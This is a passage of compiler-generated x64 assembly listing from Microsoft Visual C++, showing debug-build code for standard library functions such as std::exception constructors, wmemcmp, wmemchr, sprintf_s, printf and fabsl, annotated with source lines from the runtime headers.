; 90   :         __std_exception_destroy(&_Data);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rcx, rax
	call	__std_exception_destroy

; 91   :     }

	add	rsp, 40					; 00000028H
	ret	0
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
_Other$ = 56
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7exception@std@@6B@
	mov	QWORD PTR [rax], rcx

; 71   :         : _Data()

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 16
	rep stosb

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rcx, QWORD PTR _Other$[rsp]
	add	rcx, 8
	mov	rdx, rax
	call	__std_exception_copy

; 74   :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 16
_Message$ = 24
__formal$ = 32
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

$LN3:
	mov	DWORD PTR [rsp+24], r8d
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7exception@std@@6B@
	mov	QWORD PTR [rax], rcx

; 65   :         : _Data()

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 16
	rep stosb

; 67   :         _Data._What = _Message;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Message$[rsp]
	mov	QWORD PTR [rax+8], rcx

; 68   :     }

	mov	rax, QWORD PTR this$[rsp]
	pop	rdi
	ret	0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBD@Z
_TEXT	SEGMENT
_InitData$ = 32
this$ = 64
_Message$ = 72
??0exception@std@@QEAA@QEBD@Z PROC			; std::exception::exception, COMDAT

; 59   :     {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 48					; 00000030H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7exception@std@@6B@
	mov	QWORD PTR [rax], rcx

; 58   :         : _Data()

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 16
	rep stosb

; 60   :         __std_exception_data _InitData = { _Message, true };

	mov	rax, QWORD PTR _Message$[rsp]
	mov	QWORD PTR _InitData$[rsp], rax
	mov	BYTE PTR _InitData$[rsp+8], 1

; 61   :         __std_exception_copy(&_InitData, &_Data);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rdx, rax
	lea	rcx, QWORD PTR _InitData$[rsp]
	call	__std_exception_copy

; 62   :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 48					; 00000030H
	pop	rdi
	ret	0
??0exception@std@@QEAA@QEBD@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\wchar.h
;	COMDAT wmemcmp
_TEXT	SEGMENT
tv74 = 0
_S1$ = 32
_S2$ = 40
_N$ = 48
wmemcmp	PROC						; COMDAT

; 218  :     {

$LN9:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 219  :         for (; 0 < _N; ++_S1, ++_S2, --_N)

	jmp	SHORT $LN4@wmemcmp
$LN2@wmemcmp:
	mov	rax, QWORD PTR _S1$[rsp]
	add	rax, 2
	mov	QWORD PTR _S1$[rsp], rax
	mov	rax, QWORD PTR _S2$[rsp]
	add	rax, 2
	mov	QWORD PTR _S2$[rsp], rax
	mov	rax, QWORD PTR _N$[rsp]
	dec	rax
	mov	QWORD PTR _N$[rsp], rax
$LN4@wmemcmp:
	cmp	QWORD PTR _N$[rsp], 0
	jbe	SHORT $LN3@wmemcmp

; 220  :             if (*_S1 != *_S2)

	mov	rax, QWORD PTR _S1$[rsp]
	movzx	eax, WORD PTR [rax]
	mov	rcx, QWORD PTR _S2$[rsp]
	movzx	ecx, WORD PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN5@wmemcmp

; 221  :                 return *_S1 < *_S2 ? -1 : 1;

	mov	rax, QWORD PTR _S1$[rsp]
	movzx	eax, WORD PTR [rax]
	mov	rcx, QWORD PTR _S2$[rsp]
	movzx	ecx, WORD PTR [rcx]
	cmp	eax, ecx
	jge	SHORT $LN7@wmemcmp
	mov	DWORD PTR tv74[rsp], -1
	jmp	SHORT $LN8@wmemcmp
$LN7@wmemcmp:
	mov	DWORD PTR tv74[rsp], 1
$LN8@wmemcmp:
	mov	eax, DWORD PTR tv74[rsp]
	jmp	SHORT $LN1@wmemcmp
$LN5@wmemcmp:
	jmp	SHORT $LN2@wmemcmp
$LN3@wmemcmp:

; 222  : 
; 223  :         return 0;

	xor	eax, eax
$LN1@wmemcmp:

; 224  :     }

	add	rsp, 24
	ret	0
wmemcmp	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\wchar.h
;	COMDAT wmemchr
_TEXT	SEGMENT
_S$ = 8
_C$ = 16
_N$ = 24
wmemchr	PROC						; COMDAT

; 205  :     {

	mov	QWORD PTR [rsp+24], r8
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx

; 206  :         for (; 0 < _N; ++_S, --_N)

	jmp	SHORT $LN4@wmemchr
$LN2@wmemchr:
	mov	rax, QWORD PTR _S$[rsp]
	add	rax, 2
	mov	QWORD PTR _S$[rsp], rax
	mov	rax, QWORD PTR _N$[rsp]
	dec	rax
	mov	QWORD PTR _N$[rsp], rax
$LN4@wmemchr:
	cmp	QWORD PTR _N$[rsp], 0
	jbe	SHORT $LN3@wmemchr

; 207  :             if (*_S == _C)

	mov	rax, QWORD PTR _S$[rsp]
	movzx	eax, WORD PTR [rax]
	movzx	ecx, WORD PTR _C$[rsp]
	cmp	eax, ecx
	jne	SHORT $LN5@wmemchr

; 208  :                 return (wchar_t _CONST_RETURN*)_S;

	mov	rax, QWORD PTR _S$[rsp]
	jmp	SHORT $LN1@wmemchr
$LN5@wmemchr:
	jmp	SHORT $LN2@wmemchr
$LN3@wmemchr:

; 209  : 
; 210  :         return 0;

	xor	eax, eax
$LN1@wmemchr:

; 211  :     }

	ret	0
wmemchr	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
;	COMDAT sprintf_s
_TEXT	SEGMENT
_Result$ = 48
_ArgList$ = 56
_Buffer$ = 80
_BufferCount$ = 88
_Format$ = 96
sprintf_s PROC						; COMDAT

; 1823 :         {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	QWORD PTR [rsp+32], r9
	sub	rsp, 72					; 00000048H

; 1824 :             int _Result;
; 1825 :             va_list _ArgList;
; 1826 :             __crt_va_start(_ArgList, _Format);

	lea	rax, QWORD PTR _Format$[rsp+8]
	mov	QWORD PTR _ArgList$[rsp], rax

; 1827 :             _Result = _vsprintf_s_l(_Buffer, _BufferCount, _Format, NULL, _ArgList);

	mov	rax, QWORD PTR _ArgList$[rsp]
	mov	QWORD PTR [rsp+32], rax
	xor	r9d, r9d
	mov	r8, QWORD PTR _Format$[rsp]
	mov	rdx, QWORD PTR _BufferCount$[rsp]
	mov	rcx, QWORD PTR _Buffer$[rsp]
	call	_vsprintf_s_l
	mov	DWORD PTR _Result$[rsp], eax

; 1828 :             __crt_va_end(_ArgList);

	mov	QWORD PTR _ArgList$[rsp], 0

; 1829 :             return _Result;

	mov	eax, DWORD PTR _Result$[rsp]

; 1830 :         }

	add	rsp, 72					; 00000048H
	ret	0
sprintf_s ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
;	COMDAT _vsprintf_s_l
_TEXT	SEGMENT
_Result$ = 48
tv73 = 52
_Buffer$ = 80
_BufferCount$ = 88
_Format$ = 96
_Locale$ = 104
_ArgList$ = 112
_vsprintf_s_l PROC					; COMDAT

; 1490 :     {

$LN5:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 1491 :         int const _Result = __stdio_common_vsprintf_s(

	call	__local_stdio_printf_options
	mov	rcx, QWORD PTR _ArgList$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	mov	rcx, QWORD PTR _Locale$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Format$[rsp]
	mov	r8, QWORD PTR _BufferCount$[rsp]
	mov	rdx, QWORD PTR _Buffer$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	__stdio_common_vsprintf_s
	mov	DWORD PTR _Result$[rsp], eax

; 1492 :             _CRT_INTERNAL_LOCAL_PRINTF_OPTIONS,
; 1493 :             _Buffer, _BufferCount, _Format, _Locale, _ArgList);
; 1494 : 
; 1495 :         return _Result < 0 ? -1 : _Result;

	cmp	DWORD PTR _Result$[rsp], 0
	jge	SHORT $LN3@vsprintf_s
	mov	DWORD PTR tv73[rsp], -1
	jmp	SHORT $LN4@vsprintf_s
$LN3@vsprintf_s:
	mov	eax, DWORD PTR _Result$[rsp]
	mov	DWORD PTR tv73[rsp], eax
$LN4@vsprintf_s:
	mov	eax, DWORD PTR tv73[rsp]

; 1496 :     }

	add	rsp, 72					; 00000048H
	ret	0
_vsprintf_s_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
;	COMDAT printf
_TEXT	SEGMENT
_Result$ = 32
_ArgList$ = 40
_Format$ = 64
printf	PROC						; COMDAT

; 956  :     {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+32], r9
	sub	rsp, 56					; 00000038H

; 957  :         int _Result;
; 958  :         va_list _ArgList;
; 959  :         __crt_va_start(_ArgList, _Format);

	lea	rax, QWORD PTR _Format$[rsp+8]
	mov	QWORD PTR _ArgList$[rsp], rax

; 960  :         _Result = _vfprintf_l(stdout, _Format, NULL, _ArgList);

	mov	ecx, 1
	call	__acrt_iob_func
	mov	r9, QWORD PTR _ArgList$[rsp]
	xor	r8d, r8d
	mov	rdx, QWORD PTR _Format$[rsp]
	mov	rcx, rax
	call	_vfprintf_l
	mov	DWORD PTR _Result$[rsp], eax

; 961  :         __crt_va_end(_ArgList);

	mov	QWORD PTR _ArgList$[rsp], 0

; 962  :         return _Result;

	mov	eax, DWORD PTR _Result$[rsp]

; 963  :     }

	add	rsp, 56					; 00000038H
	ret	0
printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
;	COMDAT _vfprintf_l
_TEXT	SEGMENT
_Stream$ = 64
_Format$ = 72
_Locale$ = 80
_ArgList$ = 88
_vfprintf_l PROC					; COMDAT

; 644  :     {

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 645  :         return __stdio_common_vfprintf(_CRT_INTERNAL_LOCAL_PRINTF_OPTIONS, _Stream, _Format, _Locale, _ArgList);

	call	__local_stdio_printf_options
	mov	rcx, QWORD PTR _ArgList$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Locale$[rsp]
	mov	r8, QWORD PTR _Format$[rsp]
	mov	rdx, QWORD PTR _Stream$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	__stdio_common_vfprintf

; 646  :     }

	add	rsp, 56					; 00000038H
	ret	0
_vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
;	COMDAT __local_stdio_printf_options
_TEXT	SEGMENT
__local_stdio_printf_options PROC			; COMDAT

; 91   :         static unsigned __int64 _OptionsStorage;
; 92   :         return &_OptionsStorage;

	lea	rax, OFFSET FLAT:?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA ; `__local_stdio_printf_options'::`2'::_OptionsStorage

; 93   :     }

	ret	0
__local_stdio_printf_options ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_math.h
;	COMDAT frexpl
_TEXT	SEGMENT
_X$ = 48
_Y$ = 56
frexpl	PROC						; COMDAT

; 861  :     {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	movsd	QWORD PTR [rsp+8], xmm0
	sub	rsp, 40					; 00000028H

; 862  :         return frexp((double)_X, _Y);

	mov	rdx, QWORD PTR _Y$[rsp]
	movsd	xmm0, QWORD PTR _X$[rsp]
	call	frexp

; 863  :     }

	add	rsp, 40					; 00000028H
	ret	0
frexpl	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_math.h
;	COMDAT fabsl
_TEXT	SEGMENT
_X$ = 48
fabsl	PROC						; COMDAT

; 840  :     {

$LN3:
	movsd	QWORD PTR [rsp+8], xmm0
	sub	rsp, 40					; 00000028H

; 841  :         return fabs((double)_X);

	movsd	xmm0, QWORD PTR _X$[rsp]
	call	fabs

; 842  :     }

	add	rsp, 40					; 00000028H
	ret	0
fabsl	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$ = 8
_Where$ = 16
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 168  :     {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 169  :         (void)_Size;
; 170  :         return _Where;

	mov	rax, QWORD PTR _Where$[rsp]

; 171  :     }

	ret	0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
END
